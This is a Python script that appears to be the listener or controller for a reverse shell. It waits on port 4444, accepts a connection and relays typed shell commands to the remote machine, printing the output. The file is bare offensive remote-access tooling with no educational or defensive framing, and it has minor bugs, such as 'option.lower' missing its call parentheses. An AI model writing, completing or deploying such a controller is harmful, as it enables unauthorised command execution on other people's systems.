import socket, os

# Set IP and port to listen on
server_ip = '0.0.0.0'
server_port = 4444

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the IP and port to the server
server_socket.bind((server_ip, server_port))

# Start listening for connections
server_socket.listen(1)
print(f"[] Listening on {server_ip}:{server_port}")

# Accept the incoming connection
client_socket, client_address = server_socket.accept()
print(f"[] Accepted connection from {client_address}:{client_address}")

# Receive data and execute commands
while True:
    option = input("> ")
    if option.lower() == "shell":
        while True:
            client_socket.send("shell".encode())
            command = input("Shell > ")
            if command.lower() == "clear" or command.lower() == "cls":
                os.system("cls")
            elif command.lower() == "exit":
                break
            else:
                client_socket.send(command.encode())
                response = client_socket.recv(8192)
                print(response.decode('utf-8'))
    elif option.lower == "exit":
        break
    else:
        print("[X] Command not found!")
# Close the sockets
client_socket.close()
server_socket.close()